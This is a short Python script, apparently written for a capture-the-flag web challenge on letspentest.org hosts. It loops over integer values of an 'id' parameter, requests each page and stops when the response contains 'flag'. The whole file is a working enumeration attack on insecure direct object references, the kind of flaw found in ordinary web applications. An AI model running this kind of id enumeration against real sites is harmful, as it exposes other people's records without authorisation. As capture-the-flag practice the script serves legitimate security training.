#!/usr/bin/env python

import requests
i=0
#target="http://chal11.web.letspentest.org/user?"
target="http://chal6.web.letspentest.org//check.php?"
while True:
	out=requests.get("{}id={}".format(target,i),allow_redirects=False).text
	print("i =",i)
	print(out)
	if ("flag" in out) or ("Flag" in out):
		print("Finded flag!!!!")
		break
	print("--------------------------")
	i+=1